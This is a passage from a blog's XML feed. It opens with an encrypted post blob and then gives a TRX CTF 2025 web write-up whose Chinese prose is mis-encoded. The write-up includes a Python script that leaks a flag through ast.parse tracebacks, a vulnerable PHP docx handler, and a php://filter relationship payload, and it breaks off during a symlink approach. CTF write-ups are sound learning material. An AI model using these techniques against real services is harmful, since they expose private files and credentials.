85479cc81ac09a43693b8a785aff4e50db0b6631da70e9dc126ef465d1dde986ed20968d042680aeb8b86edef802ff1c59abd4fc96093e8d1d92fd8bffcca97a66f34ee10d96ef75f872593092d77ca171eacfbfff92fa5b7dbe1967454a1c40006f921087280e1f006d75cddb7e2c16f6fddbb6876532cad3fce3b17d4af112c676a938ce1b96134d20a0c6933a06c8d0ddb07c1175109f0414b6eaae2aff3a33b938a63d031f4e79aa1ff641d493ee1876facb60817a0582e2bdec32bebb3a5e85b98e6560da73c9002c828d967239480f743a4766c922099dc8b365d2b5a76976451402dbe5891bb95b94d1bf44763d0d1d8b2a0587df71f67003655c20e05bbb56df53d543aeff8688f3a8975de44136b4a377162286e4631f115a7d9d660dde1c0dd55926155a306a3174592162e008fddc328049ce2a134d301c86dd4c1cfe2369c9822e223848facd8a61fa52f03a22a3adcdb14baea274dbb2cf17ecf8dff7c5ea65850596a7fb9d7c7aee4343da97201c80d609e75e13a98c3acbc23f3f3868de6d3033fb0d9d16d4170b077fd59fa0d27d75215dbcf309c8e570231671a637285ebde764c82357bc78d68e9b0cdcee05cda9e68379c214566d906d316c52cb6ac8747993a66ac49edbb361cdfaabd8fdd3c9b98360845ca3960c46a448217e70b2ba12cfe232f9e8ce6aac629981cc1c020c2c2639b22993052d44c1c07d5744e3e488d416f0f6a8f10cab4cd0b18987785223dcbd4ac7e06fa8d46b835ee73e26821250921fab1b42662174edc485dc6227a282d9b9a2da620a5c7b9f48526f83c1507d4fe51fd1ebb658cdaba739ca3f5366fdb0e47a1b6735117ccb7fe92fc585aab9cce876832a03aa38b1a6b1a6b6c6036d513b7d1c57916f459cb353ef4c12426248825b7878e85b59ffa7cab48afa4abab16dc028954d3248ce020c6ee268eff9d5aaeeb7e43b1e6bca5157bb1df72d8496a1cbe663f50bc337fb432df1a47f9ae6054cf0aa01a19772931ff61f8056bc5df5bb5609cb5843eb083bb5a439cb6f6745d58575fcaf127f88ce4694f85128a4317a4009439680c6f1963e2d111729302ce0ae36af78a230ea99742fa0021cb70cdf0f93750212e4bb85f18c485aeec5770230e87ad10454905dff0061b891db919a8cef9237e69cc44089f10cc6bda33add07b42bc2e6a31d91ac58a2dce8562dcefabdfdf356966f37b23b5393ef78baa39d893bc9703ed988554ba9357b3b7054c93585ff36864a6d8fe1bc85af038c548e3a3791726e31c6632376243667de493530fe810c3ad35ae951ce277764cd060ca19ad1fb0d9f4b91d3ec28ad35350824a42c3a64ba6ecfdaa9c53db17dd6432de9f1e19b8c96695039286a504d8b3aa0663f824fc61df36fff12cf029fdd3cdcc15a26682f42169e91f7726869c64979704ddc91e782e4d07fa862115a460d85159e6a605b164c137cf99e54134a27a1f3024588eb2cac1210bec0612cc8fe7f72fd616babd9c80bacbecf80cae13e551b5af67d1b43bb46c657e640112f89f27196be41e66d9a04b8fdb8d196e694c10bd0655450a895b4a8531b182ed8a0bcd1b5653e3cfdcd501cced73a8864b73afcae63c8a95b341daf26901836e3fb230bf5d4672646ca992e1170bdf987444c476726c92eee6b8ab0d6d0db6ef00f4a4e10accdee46421428e684d58b126aae28e6880cb550661a6ee004b616c0dececb6fd85a7696e23d33baf1d24b69426301ccbc85c583f1b4f68f417a5fea6f0c6e12dd16cf9b720a76714ba24f67238cef3af8695ff60f8b484342d6ea220dc4a6924ed5a274a5ed445b24234c314e6edda903eb5aed5a32663a31ff38113d9034e4ddcd81f56ad46af8765d8de6f2beab5e14bd49dcab80f708ac53c01062e3559316e06104f946f1fab7afc7dd363118643ee42cdf5dffb26a766fd367c769f9b58b407ca84b3768be2ff4c65ed8d79fc4c348d0ee3fa56f3938706a15d97b6b3b0f566ab428e0a5f9e380170ac21ac47adf5dbe15045de792328f627e98859e1a8c11fc411a8409d34bd87c47f8e2ec1fb1fe8d4f49b01d1f67604b008444e117db0c770ef9ef00695ca6e0f1300001c91cdbc530cd481eced7670abd37ec03cacb7490be18fa934dad1c4fa543ce4ece30b3cea01656ef0bca1b97717036606ab35bb86b6dc223767440e490f96347bdfe7368f444ccce7536227ae6b255fb54c05f382104f9c389ca53db492c67d823ef521564141aa9160345b9ef28f559a9ec5c14f158df4a5456dfb355579dbf0ce345df2b440b0d425de560958a45e6c8621b25e8a87138d387e33a8d99408531cee3c3c5aba36deade1b42266afd0747d0b766588f81ee744a7bbc363369dcfa3f70487dfea7fb0a089e012c5512dc9db531e6a3e5213e583068920afbc6f6b5e3d57e02cd82e42b6039e2fbe634824a7379a71f86b7a01911d22dea0480faef0f40427efdfa8435f4d6952785a05db819883d55ef0479b2979da8adbb3027259454efe23bfab370c050353cb263f9a4dceb5e655f794c196aa0db2fa450b421a41bdc49ce39479b6e102bf291c9612a6f609b85d5fc2ab6d1bd13510e123424cfac61f6efc1bd31610a1167cf73d0bce0de076c32d7991c2d68cb1d99374598ca74ad4d46cfc204931a4fcd4e7a91df3bf60f16d267e1b71c9eb168f134cf464e35349bb89297aee4597376a07ba9052b96678e00a4266e5ae4c75af05f41cc5a4349818736b41004221f81a49bb011c71c34941831dc4fc671905747210f8d24f46d495c9fd03d00176407250c1d8c7f618e3eed2d403e4dab2b70fb315ed31e63004e5cad31e0baeeb8efec21a0165da5175b3f222a880a6b23b42b9ad2b0ad95c9c956e90c8cc88021f3138dde867a6f9fc02892d105acae470b709f71167cb99ea2632d820b2a0c10caab7d82a74fc086bf18e2f9c105ac084b4f9a64ac2d0fe1ab28795a3fb15dd1775fb5469e44a0070aeeb867b75556e617ef9002cd96ff131e0f8191eb9c274f7be13899064b721d559c8a23fd514a427be0f9130096f7d5995ea6d89a8754fb4e4abf9ef783cd8eb1b94fe9de160225749ecaf282cbc7331ca7dfd723ed18be011c9db2941248faced27adf0c2e8c9e58fa98f011ffda0141dc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æ­¤æ–‡ç« å·²åŠ å¯†æˆ–æœªå†™å®Œï¼Œè¯·è¾“å…¥å¯†ç ä»¥æŸ¥çœ‹å…¨æ–‡å†…å®¹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqliteæ³¨å…¥</tag>
      
      <tag>linuxææƒ</tag>
      
      <tag>æ—¶é—´ç›²æ³¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TRX_CTF_2025</title>
    <link href="/2025/02/22/TRX-CTF-2025/"/>
    <url>/2025/02/22/TRX-CTF-2025/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Online-Python-Editor"><a href="#Online-Python-Editor" class="headerlink" title="Online Python Editor"></a>Online Python Editor</h2><p>æºç ï¼š</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> traceback<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/check&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>    <span class="hljs-keyword">try</span>:<br>        ast.parse(**request.json)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-literal">None</span>&#125;<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: traceback.format_exc()&#125;<br>        <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>secret.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Here&#x27;s the flag: &quot;</span>)<br>    <span class="hljs-built_in">print</span>(FLAG) <br>    <br>FLAG = <span class="hljs-string">&quot;TRX&#123;fake_flag_for_testing&#125;&quot;</span><br><br>main()<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯è·å¾—<code>secret.py</code>çš„FLAG</p><p>å†<code>app.py</code>çš„checkè·¯ç”±ä¼šè§£æä¼ å…¥çš„jsonå†…å®¹æ„é€ astè¯­æ³•æ ‘ï¼Œè€Œä¸”ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªåˆ©ç”¨ç‚¹</p><p><code>ast</code>è§£ææ˜¯ä¸èƒ½æ‰§è¡Œå‘½ä»¤çš„ï¼Œåªä¼šæ£€æŸ¥è¯­æ³•ï¼Œæ‰€æœ‰æˆ‘ä»¬åªèƒ½é€šè¿‡æŠ¥é”™æ¥æ‹¿åˆ°FLAG</p><p>Pythonçš„ASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰æ¨¡å—åœ¨è§£æä»£ç æ—¶ï¼Œä¼šé€è¡Œæ£€æŸ¥è¯­æ³•ç»“æ„ã€‚å¦‚æœä»£ç ä¸­å­˜åœ¨è¯­æ³•é”™è¯¯ï¼Œè§£æå™¨ä¼šæŠ›å‡ºå¼‚å¸¸å¹¶<strong>ç»ˆæ­¢è§£æ</strong>ï¼ŒåŒæ—¶ç”Ÿæˆè¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ï¼ŒåŒ…æ‹¬</p><ul><li>æ–‡ä»¶å</li><li>å‡ºé”™è¡Œå·</li><li>æ”¹è¡Œå†…å®¹</li></ul><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„å»ºè¯·æ±‚é€šè¿‡è®¾ç½®<code>filename=&quot;secret.py&quot;</code>å†æ¢è¡Œåˆ°ç¬¬å…­è¡Œï¼Œå†æŠ¥é”™è¿”å›ç¬¬å…­è¡Œå†…å®¹</p><p>æœ€ç»ˆpayloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://python.ctf.theromanxpl0.it:7001/check&#x27;</span><br>data = &#123;<br>  <span class="hljs-string">&quot;source&quot;</span>: <span class="hljs-string">&quot;\n\n\n\n\ninvalid syntax&quot;</span>,<br>  <span class="hljs-string">&quot;filename&quot;</span>: <span class="hljs-string">&quot;secret.py&quot;</span><br>&#125;<br><br>response = requests.post(url, json=data)<br><span class="hljs-built_in">print</span>(response.json())<br><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250223004820425.png" alt="image-20250223004820425"></p><h2 id="zStego"><a href="#zStego" class="headerlink" title="zStego"></a>zStego</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;REL_FILENAME&#x27;</span>, <span class="hljs-string">&#x27;word/_rels/document.xml.rels&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hellYeah</span>(<span class="hljs-params"><span class="hljs-variable">$code</span>, <span class="hljs-variable">$msg</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-variable">$code</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$msg</span>);<br>&#125;<br><br><br><span class="hljs-comment">/* sanity checks */</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="hljs-string">&#x27;POST&#x27;</span>)<br>    <span class="hljs-title function_ invoke__">hellYeah</span>(<span class="hljs-number">405</span>, <span class="hljs-string">&#x27;Invalid request method.&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;input&#x27;</span>]))<br>    <span class="hljs-title function_ invoke__">hellYeah</span>(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Please upload a file.&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;input&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;input&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK)<br>    <span class="hljs-title function_ invoke__">hellYeah</span>(<span class="hljs-number">500</span>, <span class="hljs-string">&#x27;Upload error.&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;input&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] != <span class="hljs-string">&#x27;application/vnd.openxmlformats-officedocument.wordprocessingml.document&#x27;</span>)<br>    <span class="hljs-title function_ invoke__">hellYeah</span>(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Please upload a Word document!&#x27;</span>);<br><br><br><span class="hljs-comment">/* processing uploaded Word - valid document contains relationship table */</span><br><br><span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br><span class="hljs-variable">$zipFilename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;input&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zipFilename</span>) !== <span class="hljs-literal">true</span> || <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">locateName</span>(REL_FILENAME) === <span class="hljs-literal">false</span>)<br>    <span class="hljs-title function_ invoke__">hellYeah</span>(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;File is not a valid Word document.&#x27;</span>);<br><br><span class="hljs-variable">$relsDom</span> = <span class="hljs-title function_ invoke__">simplexml_load_string</span>(<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">getFromName</span>(REL_FILENAME));<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$relsDom</span> === <span class="hljs-literal">false</span>)<br>    <span class="hljs-title function_ invoke__">hellYeah</span>(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid object relationship table. Document may be corrupted.&#x27;</span>);<br><br><br><span class="hljs-comment">/* extract document&#x27;s &quot;media&quot; folder into a temporary directory */</span><br><span class="hljs-variable">$tmpDir</span> = <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;mktemp -d --tmpdir=/tmp/ zipXXXXXXXXX&quot;</span>);<br><span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;unzip <span class="hljs-subst">$zipFilename</span> \&quot;word/media*\&quot; -d \&quot;<span class="hljs-subst">$tmpDir</span>\&quot;&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanup</span>(<span class="hljs-params"><span class="hljs-variable">$tmpDir</span></span>) </span>&#123; <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;rm -rf <span class="hljs-subst">$tmpDir</span>&quot;</span>); &#125;<br><span class="hljs-title function_ invoke__">register_shutdown_function</span>(<span class="hljs-string">&#x27;cleanup&#x27;</span>, <span class="hljs-variable">$tmpDir</span>); <span class="hljs-comment">// cleanup in the end</span><br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$tmpDir</span>/word/media&quot;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><br><span class="hljs-variable">$messages</span> = [];<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$relsDom</span>-&gt;Relationship <span class="hljs-keyword">as</span> <span class="hljs-variable">$rel</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$rel</span>[<span class="hljs-string">&#x27;Type&#x27;</span>] == <span class="hljs-string">&#x27;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">str_starts_with</span>(<span class="hljs-variable">$rel</span>[<span class="hljs-string">&#x27;Target&#x27;</span>], <span class="hljs-string">&#x27;media/&#x27;</span>))<br>            <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$rel</span>[<span class="hljs-string">&#x27;Target&#x27;</span>], <span class="hljs-number">6</span>);<br><br>        <span class="hljs-variable">$file</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> === <span class="hljs-literal">false</span>) <span class="hljs-comment">// Object relationship table points to inexistent file. Document may be corrupted</span><br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-variable">$result</span> = @<span class="hljs-title function_ invoke__">zlib_decode</span>(<span class="hljs-variable">$file</span>); <span class="hljs-comment">// This will expose them hackers!</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> !== <span class="hljs-literal">false</span>)<br>            <span class="hljs-variable">$messages</span>[] = <span class="hljs-variable">$result</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// cleanup</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;rm -rf <span class="hljs-subst">$tmpDir</span>&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br>   &lt;!DOCTYPE html&gt;<br>    &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>    &lt;head&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>        &lt;title&gt;zStego - Results&lt;/title&gt;<br>        &lt;link href=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>    &lt;/head&gt;<br>    &lt;body <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">bg</span>-<span class="hljs-title">light</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span> <span class="hljs-title">text</span>-<span class="hljs-title">center</span> <span class="hljs-title">mt</span>-5&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h1</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">display</span>-4&quot;&gt;<span class="hljs-title">Scan</span> <span class="hljs-title">Results</span>&lt;/<span class="hljs-title">h1</span>&gt;</span><br><span class="hljs-class">            &lt;?<span class="hljs-title">php</span> <span class="hljs-title">if</span> (!<span class="hljs-title">empty</span>($<span class="hljs-title">messages</span>)): ?&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">alert</span> <span class="hljs-title">alert</span>-<span class="hljs-title">success</span> <span class="hljs-title">mt</span>-4&quot;&gt;</span><br><span class="hljs-class">                    &lt;<span class="hljs-title">h4</span>&gt;<span class="hljs-title">Hidden</span> <span class="hljs-title">Messages</span> <span class="hljs-title">Found</span>:&lt;/<span class="hljs-title">h4</span>&gt;</span><br><span class="hljs-class">                    &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">list</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                        &lt;?<span class="hljs-title">php</span> <span class="hljs-title">foreach</span> ($<span class="hljs-title">messages</span> <span class="hljs-title">as</span> $<span class="hljs-title">message</span>): ?&gt;</span><br><span class="hljs-class">                            &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">list</span>-<span class="hljs-title">group</span>-<span class="hljs-title">item</span>&quot;&gt; &lt;?= <span class="hljs-title">htmlspecialchars</span>($<span class="hljs-title">message</span>) ?&gt; &lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">                        &lt;?<span class="hljs-title">php</span> <span class="hljs-title">endforeach</span>; ?&gt;</span><br><span class="hljs-class">                    &lt;/<span class="hljs-title">ul</span>&gt;</span><br><span class="hljs-class">                &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;?<span class="hljs-title">php</span> <span class="hljs-title">else</span>: ?&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">alert</span> <span class="hljs-title">alert</span>-<span class="hljs-title">info</span> <span class="hljs-title">mt</span>-4&quot;&gt;<span class="hljs-title">No</span> <span class="hljs-title">hidden</span> <span class="hljs-title">messages</span> <span class="hljs-title">found</span>.&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;?<span class="hljs-title">php</span> <span class="hljs-title">endif</span>; ?&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">index</span>.<span class="hljs-title">php</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">btn</span> <span class="hljs-title">btn</span>-<span class="hljs-title">secondary</span> <span class="hljs-title">mt</span>-3&quot;&gt;<span class="hljs-title">Back</span> <span class="hljs-title">to</span> <span class="hljs-title">Home</span>&lt;/<span class="hljs-title">a</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p>é˜…è¯»æºç çŸ¥é“ï¼Œæˆ‘ä»¬è¦ä¸Šä¼ ä¸€ä¸ª<code>docx</code>æ–‡æ¡£ï¼Œå¿…é¡»ä¿è¯æ ¼å¼å®Œæ•´,å†<code>document.xml.rels</code>å¿…é¡»æœ‰ä¸€ä¸ª<code> http://schemas.openxmlformats.org/officeDocument/2006/relationships/image</code>å…³ç³»ï¼ŒæŒ‡å‘mediaçš„ä¸€ä¸ªæ–‡ä»¶ï¼Œä»–ä¼šç”¨<code>file_get_contents</code>å‡½æ•°å»åŒ…å«æ–‡ä»¶</p><p>æ€è·¯ï¼šæˆ‘é¦–å…ˆæƒ³åˆ°çš„æ˜¯ç›®å½•ç©¿è¶Šï¼Œä½†æ˜¯ä»–è®¾ç½®äº†<code>open_basedir</code>ç¦æ­¢äº†ç›®å½•ç©¿è¶Šã€é‚£å°±è€ƒè™‘phpä¼ªåè®®å»ç»•è¿‡<code>open_basedir</code></p><p>æ·»åŠ ä¸€ä¸ª<code>&lt;Relationship&gt;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId1&quot;</span> <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles&quot;</span> <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;media/php://filter/read=convert.zlib.deflate/resource=/flag.txt&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Relationships</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>Target</code>æŒ‡å‘<code>media/php://filter/read=convert.zlib.deflate/resource=/flag.txt</code>é‚£ä¹ˆæ–‡ä»¶åŒ…å«æ—¶å°±ä¼šåŒ…å«<code>zilb</code>ç¼–ç åçš„<code>/flag.txt</code>æœ€åè¾“å‡ºä¼šå°†å…¶è§£ç </p><p>é¦–å…ˆå»ºç«‹ä¸€ä¸ª<code>1.docx</code>ï¼Œæ”¹åç¼€<code>zip</code>è§£ç ï¼Œå†<code>document.xml.rels</code>æ·»åŠ ä¸€ä¸ª<code>&lt;Relationship&gt;</code>å†å‹ç¼©ä¸º<code>zip</code>æ”¹ä¸ºdocxä¸Šä¼ ï¼Œä½†æ˜¯æ²¡ç»“æœ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250223165318566.png" alt="image-20250223165318566"></p><p>åé¢æŸ¥è¯¢èµ„æ–™çŸ¥é“ä¸æ˜¯æ‰€æœ‰çš„<code>php://</code>ä¼ªåè®®éƒ½å¯ä»¥ç»•è¿‡<code>open_basedir</code>åªæœ‰ä¸ä¾èµ–æ–‡ä»¶ç³»ç»Ÿçš„æ‰å¯ä»¥ç»•è¿‡</p><p>æ˜¾ç„¶<code>php://filter</code>ä¸è¡Œï¼Œ</p><p>ä¸€ä¸ªæ–°çš„æ€è·¯æ˜¯åˆ©ç”¨è½¯é“¾æ¥</p><p>æˆ‘ä»¬å‘ç°ä»–æ˜¯ä½¿ç”¨çš„<code>unzip</code>æ¥è¿›è¡Œè§£å‹çš„ï¼Œ<code>unzip</code>ç”±äºå®ƒä¿ç•™äº†å¯èƒ½åŒ…å«åœ¨å¼•ç”¨å‹ç¼©æ–‡ä»¶ä¸­çš„ç¬¦å·é“¾æ¥ï¼Œå› æ­¤è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„</p><figure class="highlight php"><table><tr><td 